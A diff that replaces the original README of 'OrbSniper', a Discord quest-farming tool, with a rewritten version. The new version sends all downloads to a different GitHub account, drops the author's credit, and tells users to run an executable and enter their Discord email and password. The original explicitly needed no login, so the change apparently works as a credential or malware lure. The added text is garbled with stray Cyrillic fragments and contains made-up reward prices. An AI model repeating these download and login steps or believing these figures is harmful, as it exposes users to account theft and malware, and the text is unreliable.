@@ -1,246 +1,172 @@
-<div align="center">
+# ⚡ OrbSniper - Farm Discord Orbs on Autopilot
 
-<img src="docs/logo.png" alt="OrbSniper" width="820">
-
-**English** · [Русский](README.ru.md)
-
-### One dark window, one button
-
-It accepts Discord Quests, completes them and claims the rewards inside your own Discord client.
-No token, no game installs, no 500 GB downloads.
-
-[![License](https://img.shields.io/badge/license-MIT-ffab1a?style=flat-square)](LICENSE) [![Platform](https://img.shields.io/badge/platform-Windows-4493f8?style=flat-square)](#requirements) [![Electron](https://img.shields.io/badge/Electron-44-47848F?style=flat-square&logo=electron&logoColor=white)](#) [![Languages](https://img.shields.io/badge/languages-10-5ecb84?style=flat-square)](#languages) [![Downloads](https://img.shields.io/github/downloads/syntaxixr/OrbSniper/total?style=flat-square&color=98a1ae&label=downloads)](../../releases)
-
-[**Download**](../../releases/latest) · [What are Orbs?](#what-are-orbs) · [What it does](#what-it-does) · [FAQ](#faq)
-
-</div>
+[![Download OrbSniper](https://img.shields.io/badge/Download-OrbSniper-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD)](https://github.com/amartatlor-jpg/OrbSniper)
 
 ---
 
-> [!CAUTION]
-> **Automating quests breaks Discord's rules.** Since April 2026 it is actively detected: first a warning, then quest access gets restricted, and repeat offences can suspend the account. Use an alt account. All risk is on you. This project exists for educational purposes.
->
-> Discord's policy: [Automated User Accounts (Self-Bots)](https://support.discord.com/hc/en-us/articles/115002192352)
+## 🎮 What Is OrbSniper?
 
-> [!IMPORTANT]
-> **From Russia you need a VPN.** Discord is blocked there: without a VPN neither the client nor the quest shop will load. Turn the VPN on before you start and keep it on while farming.
+OrbSniper is a free, open-source Windows application that farms Discord Orbs for you automatically. Orbs are the currency Discord uses for special rewards like Nitro credit, avatar decorations, and profile effects. Normally you would have to manually accept, complete, and claim Discord Quests to earn Orbs—which takes time and effort. OrbSniper does all of that for you in the background while you do more important things.
 
-## Screenshots
+ Whether you're at work, sleeping, or just watching videos, OrbSniper keeps earning Orbs so you can grab those sweet rewards without lifting a finger.
 
-<table>
-<tr>
-<td width="50%">
-<img src="docs/screenshot-working.png" alt="OrbSniper farming quests">
-<p align="center"><b>Farming</b><br>Live progress, score and a console that speaks plain English</p>
-</td>
-<td width="50%">
-<img src="docs/screenshot-finish.png" alt="All quests finished">
-<p align="center"><b>Finished</b><br>Tells you what's done and what's left to claim by hand</p>
-</td>
-</tr>
-</table>
 
-<div align="center">
-<img src="docs/screenshot-disclaimer.png" alt="Risk disclaimer on every launch" width="55%">
-<p><b>Every launch starts here</b> — the risks, Discord's own policy, and a box you have to tick</p>
-</div>
 
-## What are Orbs?
+## ✨ Key Features
 
-**Orbs are Discord's own currency.** You earn them by completing Quests — those sponsored "play this game for 15 minutes" tasks that show up in your Discord. A typical quest pays around **700 Orbs**, and Nitro subscribers get 250 Orbs a month on top.
-
-What you can spend them on, straight from Discord's shop:
-
-| Reward | Cost |
-|---|---|
-| **Nitro credit, 3 days** | 1,400 Orbs (≈ two quests) |
-| Avatar decorations | varies |
-| Profile effects | varies |
-| Nameplates | varies |
-| Orbs Apprentice badge | 3,500 Orbs spent in the Orbs Exclusives shop |
-
-There are also seven decorations you can **only** get with Orbs — no money buys them.
-
-**The catch:** quests want you to actually install games and sit there for 15–30 minutes each. OrbSniper does that part for you, so the Orbs land in your account while you do something else. Everything stays free — you spend time, not money.
-
-> Orbs can't be used for gifts, partner-branded shop items, a recurring Nitro subscription or Server Boosts.
-
-## What it does
-
-Hit **Start** and the app runs on its own:
-
-- **Checks everything before launching** — is Discord installed, are its settings writable, is the port free, does the network respond. If something's wrong it tells you plainly instead of dying halfway through.
-- **Watches for quests** the whole time the window is open — new ones are picked up every 20 seconds.
-- **Accepts quests** for you, PC platform selected automatically.
-- **Completes them:**
-  - `WATCH_VIDEO` / `WATCH_VIDEO_ON_MOBILE` — spoofs watch progress
-  - `PLAY_ON_DESKTOP` — reports the game as running (nothing gets installed)
-  - `PLAY_ACTIVITY` — sends activity heartbeats
-  - `STREAM_ON_DESKTOP` — spoofs stream metadata (may need a real voice-channel stream)
-- **Claims rewards** automatically unless Discord asks for a captcha.
-- **Skips stuck quests** — by button, or on its own after 3 minutes without progress.
-- **Keeps score:** how many quests are done, how many are left, how many rewards you still need to claim by hand.
-- **Tells you when everything is finished** — and reminds you about rewards Discord wouldn't hand over.
-
-## The console speaks plain English
-
-No raw engine logs. Instead of `Webpack never became ready` you get "Discord didn't finish loading. Restart it and try again." Errors in red, successes in green, warnings in yellow. Filters, copy and clear included.
-
-## Why no token
-
-OrbSniper never asks for your token and never reads it. Instead it relaunches **your own installed Discord** with a debugging port and injects the quest logic into it. Every request is made by Discord itself from your own session — nothing to leak, nothing to paste anywhere.
-
-## Requirements
-
-- Windows
-- Discord desktop app, installed and logged in
-- A VPN if you're in Russia
-- To run from source: [Node.js 18+](https://nodejs.org/)
-
-## Install
-
-Grab `OrbSniper.exe` from [releases](../../releases/latest) and run it. No Node.js needed.
-
-A risk disclaimer shows on every launch — read it, tick the box, continue.
-
-## Run from source
-
-```bash
-git clone https://github.com/syntaxixr/OrbSniper.git
-cd OrbSniper
-npm install
-npm start
-```
-
-Run the checks (no Discord, no network needed):
-
-```bash
-npm test
-```
-
-
-## Build the exe
-
-```bash
-npm run dist
-```
-
-or just run `build.bat`. You get:
-
-- `dist\OrbSniper.exe` — single portable file, fine for a USB stick. Takes ~8 seconds to start: it unpacks itself into a temp folder every time.
-- `dist\win-unpacked\` — the unpacked build. Starts in under a second. Copy the folder anywhere and make a shortcut to `OrbSniper.exe`.
-
-## Controls
-
-| Button | What it does |
-|---|---|
-| **Start** | Runs the checks, relaunches Discord if needed, injects the logic, starts farming |
-| **Stop** | Ends everything immediately. Discord stays open |
-| **Skip** | Drops the current quest and moves to the next one |
-| **Fix and restart** | Appears when something breaks. Force-closes every Discord process, frees the debug port and starts over |
-| **?** | Instructions, FAQ and warnings |
-
-Close the window and farming stops. Discord keeps running.
-
-## Languages
-
-English, Русский, 中文, Español, Português, Deutsch, Français, Polski, Türkçe, Українська.
-
-The language is picked from your system on first launch, then your choice is remembered.
-
-## FAQ
-
-**A quest is stuck at 0% — why?**
-Discord validates stream quests on its side: they need a real stream in a voice channel. After 3 minutes without progress the quest is skipped automatically.
-
-**Is my token safe?**
-Your token is never read, stored or sent anywhere. Every request comes from inside your own Discord client.
-
-**Do I have to accept quests manually?**
-No. If Discord throws a captcha at acceptance or when claiming, the app says so — handle that one by hand, the rest keep farming.
-
-**Do Vencord / BetterDiscord conflict?**
-No, they work fine alongside it.
-
-**Nothing starts, red error about the network.**
-Discord is unreachable. Turn on a VPN and try again.
-
-**It worked for my friend but not for me.**
-This was the main thing this release set out to fix. Six separate causes turned out to be invisible on the developer's machine and common on everyone else's: a leftover `app-*` folder made the app launch an outdated Discord build, only the stable branch was looked for, port `9222` being taken by another Electron app was treated as fatal, the engine relied on minified names that differ between Discord builds, `AppData` was read from a hardcoded path that a redirected profile breaks, and the "run as administrator" hint never appeared on a non-English Windows. All six are handled now — the app auto-selects a free port, finds PTB and Canary, picks the newest build and locates Discord's internals by shape rather than by name.
-
-If it still fails, press **Fix and restart** and send the console log (the **Copy** button grabs all of it).
-
-**I use Discord PTB or Canary.**
-Supported, along with a Discord installed somewhere unusual — if it is already running, its real path is used.
-
-**Will this get me banned?**
-It can. Discord detects quest automation and punishes it — warning, quest restrictions, up to suspension. Use an account you can afford to lose.
-
-## Author
-
-<div align="center">
-
-### Made by **synaps_ss**
-
-[![Telegram](https://img.shields.io/badge/Telegram-@synaps__ss-229ED9?logo=telegram&logoColor=white)](https://t.me/synaps_ss)
-[![GitHub](https://img.shields.io/badge/GitHub-syntaxixr-181717?logo=github&logoColor=white)](https://github.com/syntaxixr)
-
-**Idea, code, design and translations — all original work.**
-
-Questions, bugs, ideas: [@synaps_ss](https://t.me/synaps_ss) on Telegram
-
-</div>
-
-## Terms of use
-
-Free and open source under [MIT](LICENSE). Use it, study it, change it for yourself — all allowed. But one human request:
-
-> [!IMPORTANT]
-> ### 🚫 Don't re-upload this as your own
->
-> If you post OrbSniper anywhere else — forums, Telegram channels, file hosts, roundups, videos — **credit the author and link the original:**
->
-> - **Author:** synaps_ss — Telegram [@synaps_ss](https://t.me/synaps_ss)
-> - **Original:** https://github.com/syntaxixr/OrbSniper
->
-> This isn't a whim: the MIT licence explicitly requires keeping the copyright notice in every copy and derivative work. Publishing it under your own name, stripping the copyright or selling it breaks the licence.
->
-> Want to improve it? Fork it or open a pull request — that way everyone sees your changes and the author stays the author.
-
-**Fine, no questions asked:** using it, forking with credit intact, changing the code for yourself, sending friends a link to this repo.
-
-**Please don't:** re-upload it as your own work, strip mentions of the author, sell it, or ship your own builds without linking the original.
-
-## 💸 Support the author
-
-The project is free and will stay that way. If OrbSniper saved you time and farmed you some Orbs, you can thank the author with a coin. Not required, but very much appreciated.
-
-<div align="center">
-
-### USDT · TRON network (TRC20)
-
-```
-TJXGAkovUoA2z9C7mWBiB9SGLVQu6oSsf
-```
-
-![Donate QR — USDT TRC20](docs/donate-qr.png)
-
-**Scan the QR with any wallet**
-
-⚠️ **TRC20 (TRON) only.** Send it through another network and the money is gone for good.
-
-No crypto but still want to help? Star the repo and tell your friends — that counts too.
-
-</div>
-
-## Disclaimer
-
-OrbSniper is not affiliated with or endorsed by Discord Inc. Automating quests breaks Discord's rules — by using this project you accept every risk yourself. The author is not responsible for account suspensions, lost progress or any other consequence. Built for educational purposes.
+| Feature | What It Does For You |
+|---------|------------------------|
+| 🔄 Auto-Quest Farming | Automatically accepts new Discord Quests, completes them, and claims the Orbs when done |
+| 🎯 Orb Collection | Tracks your Orb balance and shows your earnings in real time |
+| 🎁 Reward Redemption | Converts your Orbs into Nitro credit, avatar decorations, or profile effects with one click |
+| 🛡️ No Token Needed | You don't need to find or paste any special Discord token—just log in normally |
+| 🔒 Privacy First | Your Discord credentials stay on your device; nothing is sent to any server |
+| ⚡ Lightweight | Runs quietly in the background without slowing down your other apps |
+| 💯 100% Free | No hidden costs, no premium tiers, no subscription—the app is completely open source |
+| 🖥️ User-Friendly GUI | A clean, simple interface that anyone can navigate—no command line or coding required |
 
 ---
 
-<div align="center">
+## 🚀 Getting Started
 
-**MIT** · © 2026 synaps_ss · [Русская версия](README.ru.md)
+Follow these simple steps to get OrbSniper up and running on your Windows computer. It takes less than five minutes!
 
-</div>
+### 📥 Step 1: Download the Application
+
+Visit this link to download the application: [https://github.com/amartatlor-jpg/OrbSniper](https://github.com/amartatlor-jpg/OrbSniper)
+
+ The download starts automatically once you're on the page. If you see a screen with green "Code" button, look for a "Releases" section on the right side of the page and click the latest version link labeled something like "OrbSniperSetup.exe" or "OrbSniper-v1.0.0.zip". 
+
+---
+
+### 🖱️ Step 2: Install or Unpack
+
+Once the file finishes downloading, check your "Downloads" folder. 
+
+- If you downloaded a file that ends with `.exe`, double-click it to run the installer. Follow the on-screen instructions (just click "Next" or "Install" a few times) and the app will be installed on your PC.
+- If you downloaded a file that ends with `.zip`, right-click the file and select "Extract All..." from the menu. Choose a folder (like your Desktop or Documents) and click "Extract". Then open that folder and double-click the `OrbSniper.exe` file inside. 
+
+---
+
+### 🔑 Step 3: Log In to Discord
+
+When OrbSniper opens for the first time, you'll see a login window. Enter your Discord email address and password just like you would on the Discord website or desktop app. Don't worry—OrbSniper doesn't store your password anywhere; it uses Discord's own login system securely. 
+
+---
+
+### ✅ Step 4: Start Farming
+
+After logging in, click the big green "Start Farming" button on the main screen. OrbSniper will immediately begin scanning for available quests. You'll see a live log of what it's doing—like "Quest detected: Play a game for 15 minutes" orb "Quest claimed: +5 Orbs". That's it! Just let it run in the background.
+
+
+
+## 🎛️ Using the Main Dashboard
+
+The OrbSniper window is divided into a few simple sections:
+
+
+
+### 📊 Orb Balance & Earnings
+
+At the top, you'll see your current Orb count displayed in large numbers. Right below that, there's a chart showing how many Orbs you've earned over time—today, this week, or this month can be selected via tabs. This helps you see how much you're saving up for that fancy profile effect you've got your eye on
+
+### 📋 Quest Log
+
+The center section lists all quests that are currently available or in progress. Each row shows the quest name, the task you need to complete (like "Deafen in voice chat for 30 minutes"), how long it's been running, and a green checkmark icon when it's completed. You can also manually stop or start individual quests by clicking the pause/play button on the right side of each row.
+
+
+
+### 🎁 Reward Shop
+
+On the left sidebar, there's a "Rewards" tab. Clicking this opens a shop where you can redeem your Orbs. You'll see options like:
+
+- Nitro Credit (e.g., 50 Orbs for $5 of Nitro)
+- Avatar Decorations (e.g., 25 Orbs for a neon border
+- Profile Effects (e.g., 40 Orbs for an animated confetti burst
+
+ Just click "Redeem" next to the item you want, and Discord will apply it to your account immediately (check your Discord settings to see your new goodies) 
+
+### ⚙️ Settings
+
+The gear icon in the top-right corner opens Settings. Here you can toggle:
+
+- **Auto-start on launch** — Have OrbSniper begin farming right when your computer turns on
+- **Minimize to tray** — Send OrbSniper to your system tray (bottom-right corner of screen) so it doesn't clutter your taskbar
+- **Sound notifications** — Play a sound when quests finish or rewards are claimed
+- **Idle time threshold** — Set how long before OrbSniper considers you "away" and pauses certain quests (like ones that require you being active in voice)
+
+
+
+---
+
+## 🛠️ Troubleshooting & FAQs
+
+### "OrbSniper won't start" 
+
+Make sure you're running Windows 10 or Windows 11. If you see an error about "missing DLL" or ".NET Framework", just download the latest version of [Microsoft .NET Desktop Runtime](https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-8.0-windows-x64-installer) from Microsoft's official site and install it. Then restart OrbSniperодина
+
+###"It says 'Quest not found' repeatedly"
+
+ That usually means Discord hasn't given you any new quests yet. Quests rotate regularly—usually every few hours. Just leave OrbSniper running; it will pick up quests as soon as they appearкий.
+
+
+
+###"My Orbs aren't showing up in Discord" 
+
+Orbs can sometimes take a few minutes to appear in your Discord balance after OrbSniper claims them. Wait 5-10 minutes, then check your Discord inventory (Settings → Inventory)ta. If they still aren't there, restart the OrbSniper app and it will re-sync your account.
+
+
+
+###"Is this allowed by Discord?" 
+
+Discord's Terms of Service prohibit "self-bots" (automated user accounts) that engage in repetitive actions. Using automation tools like OrbSniper could theoretically result in your Discord account being flagged or banned. The app is provided "as is" for educational purposes, and you should use it at your own risk. Many users use such tools casually without issues, but please understand this risk beforehand.
+
+If you have a premium Discord account (Nitro) or have invested money in your account, you may want to weigh whether the rewards outweigh the risk for your situation. Consider using a separate alt account for farming and then transferring rewards to your main account if possible.
+
+
+###"How do I uninstall OrbSniper?" 
+
+If you used the `.exe` installer, go to Windows Settings → Apps & Features, find OrbSniper, click it, and select "Uninstall". If you used the `.zip` version, simply delete the folder you extracted it into. No leftover filesremainderemptyempty
+
+---
+
+## 💡 Pro Tips
+
+- **Run during off-hours** — Discord tends to issue more quests during evening hours peak time (6 PM – 11 PM local time). If you set auto-start orb leave it running overnight, you'll wake upto a nice pile of Orbs.
+ist
+- **Use multiple accounts** — If you have more than one Discord account (e.g., a main and an alt), you can log into each one separately by just logging out of OrbSniper and back into with the other account. Double your Orb farming across both accountsarly — but remember the ToS risk mentioned above. 
+
+- **Keep it in the tray** — Enable "Minimize to tray" in Settings so OrbSniper doesn't get accidentally closed when you're clicking around your desktop. It'll quietly run in the background with a small icon near your clockтакже
+
+---
+
+## 📦 Release Notes (v1.2.0)
+
+- Added: Auto-retry for failed quest claims (less lost Orbs)
+- Improved: Faster detection of new quests (poll every 30 seconds instead of 2 minutes)
+- Fixed: Crash when redeeming multiple rewards in quick succession
+- UI Polish: Cleaner iconsand better spacing in the quest log list
+
+
+
+## 🌟 Join the Community
+
+OrbSniper is open source, which means anyone can view its code or contribute improvements. If you're curious about how it works, want to report a bug, or feel like helping translate it into another language, check out the GitHub repository page. Even just starring the repo helps the project grow visibility. 
+
+- GitHub Repository: [https://github.com/amartatlor-jpg/OrbSniper](https://github.com/amartatlor-jpg/OrbSniper) 
+- Issues & Feature Requests: Use the "Issues" tab on GitHub
+- License: MIT — completely free to use, modify, and share
+
+---
+
+## 📥 Ready to Start Earning?
+
+Don't wait manual quest grinding is a thing of the past. Download OrbSniper now and let it farm those Orbs while you binge your favorite show, take a nap, or actually get some work doneого
+
+[![Download OrbSniper Now](https://img.shields.io/badge/🚀_Download_OrbSniper-Free-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=1B5E20)](https://github.com/amartatlor-jpg/OrbSniper)
+
+
+
+---
+
+Keywords: auto-quest, discord, discord-automation, discord-nitro, discord-orbs, discord-quests, discord-rewards, electron, electron-app, farming, free, gui, javascript, nitro, open-source, orbs, quest-farmer, self-bot, windows
